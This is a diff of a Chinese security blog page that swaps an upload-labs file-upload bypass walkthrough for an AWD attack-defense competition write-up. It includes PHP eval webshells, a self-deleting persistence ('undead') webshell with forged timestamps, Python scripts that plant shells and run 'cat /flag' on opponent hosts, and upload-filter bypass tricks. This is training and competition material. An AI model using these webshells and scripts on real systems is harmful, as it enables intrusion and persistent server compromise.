@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="upload-labs通关笔记, Atmujie">
+    <meta name="keywords" content="浅谈awd流程, Atmujie">
     <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>upload-labs通关笔记 | Atmujie</title>
+    <title>浅谈awd流程 | Atmujie</title>
     <link rel="icon" type="image/png" href="/weblogo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -138,12 +138,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">upload-labs通关笔记</h1>
+                    <h1 class="description center-align post-title">浅谈awd流程</h1>
                 </div>
             </div>
         </div>
@@ -260,8 +260,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
-                                <span class="chip bg-color">靶场</span>
+                            <a href="/tags/AWD/">
+                                <span class="chip bg-color">AWD</span>
                             </a>
                         
                     </div>
@@ -276,7 +276,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-19
+                    2021-05-20
                 </div>
                 
 
@@ -292,194 +292,165 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="upload-labs通关笔记"><a href="#upload-labs通关笔记" class="headerlink" title="upload-labs通关笔记"></a>upload-labs通关笔记</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180712092548-81b98800-8572-1.png" alt="img"></p>
-<h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass-1"></a>pass-1</h2><h3 id="mypayload-抓包绕过"><a href="#mypayload-抓包绕过" class="headerlink" title="mypayload,抓包绕过"></a>mypayload,抓包绕过</h3><blockquote>
-<p>只在前端js文件中写了过滤</p>
-<p>通过抓包绕过白名单</p>
-<p>​    <img src="image-20210513152712152.png" alt="image-20210513152712152"></p>
-<p>上传木马成功</p>
-<p>使用蚁剑链接</p>
-<p>​    <img src="image-20210513152933069.png" alt="image-20210513152933069"></p>
-<p>post传参</p>
-<p><img src="image-20210513163952467.png" alt="image-20210513163952467"></p>
-<p>得到数据，成功</p>
-<p>通关</p>
-</blockquote>
-<h3 id="wp，取消前端js文件验证"><a href="#wp，取消前端js文件验证" class="headerlink" title="wp，取消前端js文件验证"></a>wp，取消前端js文件验证</h3><blockquote>
-<p>浏览器可以禁用js的方法，</p>
-<p>在火狐浏览器里，访问url:<code>about:config</code></p>
-<p>搜索<strong>javascript.enabled</strong></p>
-<p>将true改成false</p>
-<p>在谷歌浏览器中，只需打开设置，禁止使用JavaScript即可</p>
-<p><img src="image-20210513160928950.png" alt="image-20210513160928950"></p>
-<p>无论多么强大的js，都会在这里一键禁用</p>
-</blockquote>
-<h3 id="wp-前端手动写入允许php文件通过"><a href="#wp-前端手动写入允许php文件通过" class="headerlink" title="wp,前端手动写入允许php文件通过"></a>wp,前端手动写入允许php文件通过</h3><blockquote>
-<p>前端的html,js内容可以在页面上进行更改，所以只需在浏览器页面前端添加php文件白名单即可</p>
-</blockquote>
-<h2 id="pass-2"><a href="#pass-2" class="headerlink" title="pass-2"></a>pass-2</h2><h3 id="mypayoad，抓包绕过"><a href="#mypayoad，抓包绕过" class="headerlink" title="mypayoad，抓包绕过"></a>mypayoad，抓包绕过</h3><blockquote>
-<p>提示是：本pass在服务端对数据包的MIME进行检查！</p>
-<p>和第一关一样，抓包就可以绕</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/B_roin/article/details/104819158?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">mime详解</a></p>
-<p>简单来说，网站检测上传的mime信息</p>
-<p><img src="https://img-blog.csdnimg.cn/20200315212124282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Jfcm9pbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>直接发送内含木马的jpg文件相当于除了内容都和jpg一致，Content-Type自然是jpg文件</p>
-<p><img src="image-20210513155924161.png" alt="image-20210513155924161"></p>
-</blockquote>
-<h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass-3"></a>pass-3</h2><h3 id="mypayload-漏网之鱼-phtml"><a href="#mypayload-漏网之鱼-phtml" class="headerlink" title="mypayload,漏网之鱼.phtml"></a>mypayload,漏网之鱼.phtml</h3><blockquote>
-<p>根据提示，pass3为黑名单过滤</p>
-<p><img src="image-20210513180022279.png" alt="image-20210513180022279"></p>
-<p>只过滤了四种文件后缀，存在漏网之鱼</p>
-<p>.phtml</p>
-<ul>
-<li><p>php后缀</p>
-<p>  php文件使用一般有三种情况</p>
-<p>  1、单纯的使用php代码，后缀为.php</p>
-<p>  2、单纯使用html，后缀为,html</p>
-<p>  3、使用html并且嵌套php,后缀使用.php或者.phtml均可</p>
-</li>
-</ul>
-<p>pass3没有对html文件和phtml文件进行过滤，所以可以上传这两种文件绕过黑名单</p>
-<p><img src="image-20210513180701293.png" alt="image-20210513180701293"></p>
-</blockquote>
-<h3 id="wp-漏网之鱼-php3"><a href="#wp-漏网之鱼-php3" class="headerlink" title="wp,漏网之鱼.php3"></a>wp,漏网之鱼.php3</h3><blockquote>
-<p>同上，.php3的文件也可以执行php</p>
-</blockquote>
-<h2 id="pass-4"><a href="#pass-4" class="headerlink" title="pass-4"></a>pass-4</h2><h3 id="mypayload-htaccess配置文件执行"><a href="#mypayload-htaccess配置文件执行" class="headerlink" title="mypayload,.htaccess配置文件执行"></a>mypayload,.htaccess配置文件执行</h3><blockquote>
-<p>这关过滤的很死，基本不存在直接上传php文件的可能</p>
-<p>htaccess文件是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>htaccess文件用于apache服务器</p>
-<p>htaccess文件可以定义文件解析的方式，可以规定解析特定的文件格式，如定义将jpg文件中符合PHP规则的文件解析为php</p>
-<p>为了方便起见，我设置所有文件中符合php规则的都会被执行</p>
-<p>SetHandler   application/x-httpd-php</p>
-<p>上传后再上传=一句话</p>
-<p><img src="image-20210513203300081.png" alt="image-20210513203300081"></p>
-</blockquote>
-<h2 id="pass-5"><a href="#pass-5" class="headerlink" title="pass-5"></a>pass-5</h2><h3 id="mypayload，后缀字母大小写绕过"><a href="#mypayload，后缀字母大小写绕过" class="headerlink" title="mypayload，后缀字母大小写绕过"></a>mypayload，后缀字母大小写绕过</h3><blockquote>
-<p>大意了大意了，之前顺手命名为shell.PhP,一下就传上去了</p>
-<p>后缀名大小写即可</p>
-<p><img src="image-20210513205849351.png" alt="image-20210513205849351"></p>
-<p>看代码才知道，它把大小写过滤去掉了</p>
-<p><img src="image-20210513205947144.png" alt="image-20210513205947144"></p>
-<p><img src="image-20210513210025401.png" alt="image-20210513210025401"></p>
-</blockquote>
-<h2 id="pass-6"><a href="#pass-6" class="headerlink" title="pass-6"></a>pass-6</h2><h3 id="mypayload，后缀空格绕过"><a href="#mypayload，后缀空格绕过" class="headerlink" title="mypayload，后缀空格绕过"></a>mypayload，后缀空格绕过</h3><blockquote>
-<p>这关没什么思路，看了源码发现没有首尾去空，所以抓包再后缀名后加空格</p>
-<p>但上传文件后报错404，看了wp，发现我思路没错</p>
-<p>后来在一个师傅的博客里找到了答案</p>
-<p><img src="image-20210514172103326.png" alt="image-20210514172103326"></p>
-<p><strong>基于windows。。。</strong></p>
-<p><strong>换windows靶机，执行成功</strong></p>
-<p><img src="image-20210514171714656.png" alt="image-20210514171714656"></p>
-</blockquote>
-<blockquote>
-<p>win系统会把后缀后的空格自动消除，而网页上传的空格会解析为url编码，从而使黑名单无法匹配文件后缀名，产生绕过</p>
-<p>上传成功后win系统自动消除后缀后的空格，使我们可以正常的使用文件中的代码</p>
-</blockquote>
-<h2 id="pass-7"><a href="#pass-7" class="headerlink" title="pass-7"></a>pass-7</h2><h3 id="mypayload，后缀加点绕过黑名单"><a href="#mypayload，后缀加点绕过黑名单" class="headerlink" title="mypayload，后缀加点绕过黑名单"></a>mypayload，后缀加点绕过黑名单</h3><blockquote>
-<p>看源码，没有过滤后缀名后的点</p>
-<p>抓包，shell.php.</p>
-<p>上传</p>
-<p>成功</p>
-<p><img src="image-20210514173558631.png" alt="image-20210514173558631"></p>
-</blockquote>
-<blockquote>
-<p>原理同pass-6，不过pass-7的原理为：win系统会自动消除后缀后的没有其他字符的点</p>
-<p>例如：1.php……….   会变为1.php 按php文件解析</p>
-<p>​            1.php………jpg 点不会消除，会当作jpg文件解析</p>
-<p>这么做大概是为了防止未知后缀错误</p>
-</blockquote>
-<h2 id="pass-8"><a href="#pass-8" class="headerlink" title="pass-8"></a>pass-8</h2><h3 id="mypayload-后缀加-DATA绕过检测"><a href="#mypayload-后缀加-DATA绕过检测" class="headerlink" title="mypayload,后缀加::$DATA绕过检测"></a>mypayload,后缀加::$DATA绕过检测</h3><blockquote>
-<p>在php+Windows的情况下：如果文件名+”::$DATA” 会把 “::$DATA”之后的数据当成文件流处理，不会检测后缀名且保持”::$DATA”之前的文件名</p>
-<p>pass-8取消了对::$DATA的检测</p>
-<p>只需抓包改后缀为php::$DATA即可，此方法同样基于windows，不适用linux</p>
-</blockquote>
-<h2 id="pass-9"><a href="#pass-9" class="headerlink" title="pass-9"></a>pass-9</h2><h3 id="mypayload，代码漏洞"><a href="#mypayload，代码漏洞" class="headerlink" title="mypayload，代码漏洞"></a>mypayload，代码漏洞</h3><blockquote>
-<p>pass-9中第15行代码保存时连接的不是最后一行处理的数据，造成漏洞</p>
-<p><img src="image-20210514202915072.png" alt="image-20210514202915072"></p>
-<p>所以构造后缀：php. . [php(点，空格，点)]</p>
-</blockquote>
-<h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h2><h3 id="mypayload，后缀双写绕过"><a href="#mypayload，后缀双写绕过" class="headerlink" title="mypayload，后缀双写绕过"></a>mypayload，后缀双写绕过</h3><blockquote>
-<p>提示：本pass会从文件名中<strong>去除</strong>.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p>
-<p>看到去除，我第一时间想到了双写绕过</p>
-<p>shell.pphphp</p>
-<p>去除中间php后刚好再次构成php</p>
-<p><img src="image-20210514214309158.png" alt="image-20210514214309158"></p>
-<p>成功</p>
-</blockquote>
-<h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><h3 id="wp-00截断，GET传参"><a href="#wp-00截断，GET传参" class="headerlink" title="wp,%00截断，GET传参"></a>wp,%00截断，GET传参</h3><blockquote>
-<p>不会做，看了wp</p>
-<p><strong>重点注意！！</strong></p>
-<p><strong>需要两个条件：php版本小于5.3.4；php的magic_quotes_gpc为OFF状态</strong></p>
-<p>我就是ON状态一直没做出来</p>
-<p>上传，发现get有路径，使用%00截断</p>
-<p><img src="image-20210515182822261.png" alt="image-20210515182822261"></p>
-<p>这样就可以造成一个含有.php的路径</p>
-<p><img src="image-20210515183055922.png" alt="image-20210515183055922"></p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$file_ext</span> 截取文件的后缀名进行检查
-<span class="token variable">$img_path</span> 设置路径时定义了保存的命名方式
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>只要我们在$_GET处使用%00截断，就可以得到一个php后缀的文件</p>
-<p>而白名单的检测仍是jpg文件</p>
-<p><img src="image-20210515185040744.png" alt="image-20210515185040744"></p>
-<p>相当于网站自己把jpg文件保存并重命名未php文件</p>
-</blockquote>
-<h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h2><h3 id="wp-00截断，POST传参"><a href="#wp-00截断，POST传参" class="headerlink" title="wp,%00截断，POST传参"></a>wp,%00截断，POST传参</h3><p><img src="image-20210515200249282.png" alt="image-20210515200249282"></p>
-<blockquote>
-<p><strong>这里我自己做一直没成功，看了wp才想起来，get传参会将特殊符号转化成url编码，并在传给变量时自动解码，post传参没有解码url一说</strong></p>
-<p><strong>所以在截断时我们需要自己解码，解码后是个空值</strong></p>
-<p>不要直接使用空格，空格是%20(应该没人这么憨)</p>
-</blockquote>
-<p><img src="image-20210515201425688.png" alt="image-20210515201425688"></p>
-<h2 id="0x00-00截断原理"><a href="#0x00-00截断原理" class="headerlink" title="0x00/%00截断原理"></a>0x00/%00截断原理</h2><blockquote>
-<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p>
-<p>php 00截断</p>
-<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
-<p>magic_quotes_gpc需要为OFF状态</p>
-<p>include和require一般在网站内部读取文件</p>
-<p>file_get_contents一般用于打开一个url或一个文件</p>
-<p>file_exists判断文件是否存在</p>
-</blockquote>
-<h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h2><h3 id="mypayload-amp-amp-wp-上传图片马"><a href="#mypayload-amp-amp-wp-上传图片马" class="headerlink" title="mypayload&amp;&amp;wp,上传图片马"></a>mypayload&amp;&amp;wp,上传图片马</h3><blockquote>
-<p>上传图片马</p>
-<p>制作方法：</p>
-<p>准备一张任意的图片，一个一句话木马文件</p>
-<p>打开cmd</p>
-<p>输入：</p>
-<pre class="line-numbers language-cmd"><code class="language-cmd">copy 1.jpg/b+shell.php myshell.jpg
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><strong>图片马有制作失败的可能，这是由于图片本身的问题，为了尽可能的规避问题，除了可以将一句话文件改为无法显示的jpg外，可以寻炸能够制作木马的图片，图片内存越小，成功率越高</strong></p>
-<p><strong>php文件首行最好添加一些无用字符，防止copy后出现未知错误</strong></p>
-<p><img src="image-20210516100647057.png" alt="image-20210516100647057"></p>
-</blockquote>
-<h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h2><h3 id="mypayload-图片马利用，文件包含"><a href="#mypayload-图片马利用，文件包含" class="headerlink" title="mypayload,图片马利用，文件包含"></a>mypayload,图片马利用，文件包含</h3><blockquote>
-<p><strong>直接包含上传的图片马即可，这里可以检测图片马有没有制作成功</strong></p>
-<p><img src="image-20210516103341356.png" alt="image-20210516103341356"></p>
-</blockquote>
-<h2 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h2><blockquote>
-<p>靶场炸了</p>
-</blockquote>
-<h2 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h2><blockquote>
-<p>二次渲染绕过，奈何我绕了好半天都过不去，先放放</p>
-</blockquote>
-<h2 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h2><h3 id="mypayload-，条件竞争"><a href="#mypayload-，条件竞争" class="headerlink" title="mypayload ，条件竞争"></a>mypayload ，条件竞争</h3><blockquote>
-<p><strong>条件竞争</strong></p>
-<p><strong>审代码，本关是先保存到本地，然后检查，如果是白名单内文件就保存，不是就删除，可这其中有个删除的时间差</strong></p>
-<p><strong>大量发包非白名单的文件，然后再服务器没有删除之前访问，就叫做条件竞争</strong></p>
-</blockquote>
-<blockquote>
-<p>上传shell.php,burp抓包，发送爆破模块</p>
-<p><img src="image-20210516155951818.png" alt="image-20210516155951818"></p>
-<p>数值爆破一万次，爆破的同时访问</p>
-<p><img src="image-20210516160042058.png" alt="image-20210516160042058"></p>
-<p>成功</p>
-</blockquote>
-<h2 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h2><h3 id="wp-条件竞争"><a href="#wp-条件竞争" class="headerlink" title="wp,条件竞争"></a>wp,条件竞争</h3><blockquote>
-<p>同pass-17为条件竞争，但本关的逻辑是先检查后缀，检查后保存，然后重命名</p>
-<p>所以我们可以上传一个图片马，然后使用条件竞争让服务端来不及改名</p>
-<p><img src="image-20210516215809838-1621173491144.png" alt="image-20210516215809838"></p>
-<p>这时如果有文件包含漏洞，就可以执行命令</p>
-</blockquote>
+                <h1 id="浅谈awd流程"><a href="#浅谈awd流程" class="headerlink" title="浅谈awd流程"></a>浅谈awd流程</h1><p>自从上次被虐已经过去了一个月，今天我自己搭建了一个平台，来模拟一次awd</p>
+<p>平台搭建就不说了，自己找个靶场就可以玩</p>
+<p>不过为了模拟效果，我自己搭建了一个平台</p>
+<p><img src="image-20210620104507913.png" alt="image-20210620104507913"></p>
+<p>我选了较为简单的靶场</p>
+<p><img src="image-20210620113251720.png" alt="image-20210620113251720"></p>
+<p>开搞</p>
+<h2 id="手速——awd必做流程"><a href="#手速——awd必做流程" class="headerlink" title="手速——awd必做流程"></a>手速——awd必做流程</h2><p>第一步大家都一样，是个拼速度的工作</p>
+<h3 id="连接xshell"><a href="#连接xshell" class="headerlink" title="连接xshell"></a>连接xshell</h3><p>更改ssh连接密码，如何不想被别人把你的改了，这步可以忽略</p>
+<p>当然大多数情况密码是随机的，所以延后处理</p>
+<p><img src="image-20210620113846062.png" alt="image-20210620113846062"></p>
+<p><strong>连接后直接passwd即可</strong></p>
+<h3 id="连接Xftp"><a href="#连接Xftp" class="headerlink" title="连接Xftp"></a>连接Xftp</h3><p>将网站源代码dump下来</p>
+<p><img src="image-20210620113534534.png" alt="image-20210620113534534"></p>
+<p>直接打包即可，打包后scp到本机，个人感觉用scp命令比直接拖快一点</p>
+<p>这里也是给自己一个备份，不然被打崩了都没法恢复</p>
+<h3 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h3><p>进后台，改自己后台密码，你一定不想自己的堡垒机自己进不去，对面改了你的密码疯狂打你</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><h3 id="快速修复简单的shell"><a href="#快速修复简单的shell" class="headerlink" title="快速修复简单的shell"></a>快速修复简单的shell</h3><p>将源码拖进D盾，这可以让我们快速找到已知的一句话</p>
+<p>当然大多数时候是找不到的</p>
+<p><img src="image-20210620145614203.png" alt="image-20210620145614203"></p>
+<p>找到了几个后门，迅速确定一下，然后关掉它们</p>
+<p><img src="image-20210620145938906.png" alt="image-20210620145938906"></p>
+<p><img src="image-20210620145946523.png" alt="image-20210620145946523"></p>
+<p>在自己本机上运行，尝试着执行这些shell拿到flag，本地一分钟内起不了就算了，盲猜效果或者拿自己的靶机测试</p>
+<p>不过这步其实没有必要，D盾能扫到的，大家一般都修复了，如果有新手或者菜鸟，到可以试试</p>
+<p>当然说不定有人没修</p>
+<p>并时刻注意靶机的运行状态，不要让网站崩掉，一但崩掉，立刻修复网站，防止掉分</p>
+<h3 id="利用漏洞，批量化flag"><a href="#利用漏洞，批量化flag" class="headerlink" title="利用漏洞，批量化flag"></a>利用漏洞，批量化flag</h3><p>最简单的shell.php文件夹不做分析，学过的都懂，这里直接分析其他的</p>
+<p><img src="image-20210620151059343.png" alt="image-20210620151059343"></p>
+<p>拿log1.php举例分析</p>
+<p>这里绝对式故意的，将get，post等请求的参数进行json编码，然后写进log.php文件</p>
+<p>过分的是上面的log.txt居然注释了</p>
+<p>以防万一，这里直接把 fwrite 注释掉</p>
+<p>在本地上传成功，直接打</p>
+<p><img src="image-20210620152632174.png" alt="image-20210620152632174"></p>
+<p><img src="image-20210620152836205.png" alt="image-20210620152836205"></p>
+<p><img src="image-20210620152922773.png" alt="image-20210620152922773"></p>
+<p>这样就拿到了flag</p>
+<p>flag每五分钟刷新一轮，所以我们无论找到几个利用点，只需要提一次flag即可</p>
+<p>一般awd队伍常在30队以上，一个个提显然是不明智的，所以我们需要写批量化脚本</p>
+<p>顺手提掉到手的flag，浪费可耻，开始写脚本</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> os
+
+<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    shell_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/include/log1.php"</span>
+    data_a <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"aa"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php @eval($_POST[atmujie]);?>"</span>
+    <span class="token punctuation">}</span>
+    res_shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> shell_url <span class="token punctuation">,</span>data<span class="token operator">=</span>data_a<span class="token punctuation">)</span>
+    shell_url_2 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/log.php"</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"atmujie"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>
+    <span class="token punctuation">}</span>
+    res_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url_2<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    <span class="token keyword">return</span> res_flag
+
+<span class="token keyword">for</span> ip <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> ip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    url <span class="token operator">=</span> <span class="token string">"http://1.15.224.114:900{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
+    shell_flag <span class="token operator">=</span> shell<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"hctf{(.*?)}"</span><span class="token punctuation">,</span>shell_flag<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    flag <span class="token operator">=</span> <span class="token string">"hctf{"</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">"}"</span>
+    sy <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'curl -X POST http://192.168.135.133:19999/api/flag -H "Authorization: 576d130d6ab595dc5a60e8f9b197a879" -d "{ \\"flag\\": \\"hctf{'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'}\\" }"'</span><span class="token punctuation">)</span>
+    sy <span class="token operator">=</span> str<span class="token punctuation">(</span>sy<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>真的扎心，一个批量化我写了二十多分钟,还写的贼拉跨，还是不够强</p>
+<p>然后就可以每轮提一波了</p>
+<h3 id="审计D盾未能扫到的漏洞"><a href="#审计D盾未能扫到的漏洞" class="headerlink" title="审计D盾未能扫到的漏洞"></a>审计D盾未能扫到的漏洞</h3><p>当利用完了很明显的后门，接下来就该审计代码，找找不那么明显的后门了</p>
+<p>这里不做分析，根据情况审计即可</p>
+<h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>找到可利用的后门后，一个个的跑一句话显然是不理智的，这样会很麻烦</p>
+<p>不提耗时的问题，只说漏洞被对方修复或者网站出现问题就会功亏一溃</p>
+<p>直接利用不是一个好主意，这时就要用到权限维持</p>
+<h3 id="上传不死马"><a href="#上传不死马" class="headerlink" title="上传不死马"></a>上传不死马</h3><p>不死马是维持权限最简单好用的办法</p>
+<p>原理：</p>
+<p>​    通过已知的漏洞，写入一个自启动的php文件，该文件会将脚本写入opcode,达成根据设定好的时间自动运行的效果</p>
+<p>不死马脚本：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'.atmujie.php'</span><span class="token punctuation">;</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'&lt;?php if(md5($_GET["password"])=="7ac0852c4c3cfff535d3c746a9064daf"){@eval($_POST[a]);} ?>'</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//pass=pass</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'touch -m -d "2018-12-01 09:10:12" .atmujie.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+    <span class="token comment" spellcheck="true">//password=atmujie</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功传入不死马后，我们可以通过不死马来提flag</p>
+<p><img src="image-20210620195003656.png" alt="image-20210620195003656"></p>
+<p>当然不死马的伪装的好不好，得看思路骚不骚</p>
+<p>这里有个小误区</p>
+<h4 id="批量上传"><a href="#批量上传" class="headerlink" title="批量上传"></a>批量上传</h4><p>同直接对漏洞的利用，一个一个的传不死马同样很麻烦，所以写批量脚本来解决这个问题</p>
+<p>一键上传所有存在此漏洞的队伍</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> urlsafe_b64encode
+<span class="token keyword">import</span> re
+<span class="token keyword">from</span> sys <span class="token keyword">import</span> exec_prefix
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span>quote
+<span class="token keyword">import</span> os
+
+<span class="token comment" spellcheck="true">#读取一句话木马</span>
+<span class="token keyword">def</span> <span class="token function">tip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"E:\My_木马\awd不死马\mujie.php"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        mujie <span class="token operator">=</span> quote<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> mujie
+
+<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>mujie<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"admin_ccmd"</span><span class="token punctuation">:</span> <span class="token string">"file_put_contents(\"/var/www/html/m1ujie.php\",urldecode(\"{}\"));"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>mujie<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true"># print(data)</span>
+    res_post <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"/include/shell.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">"成功"</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    mujie <span class="token operator">=</span> tip<span class="token punctuation">(</span><span class="token punctuation">)</span>
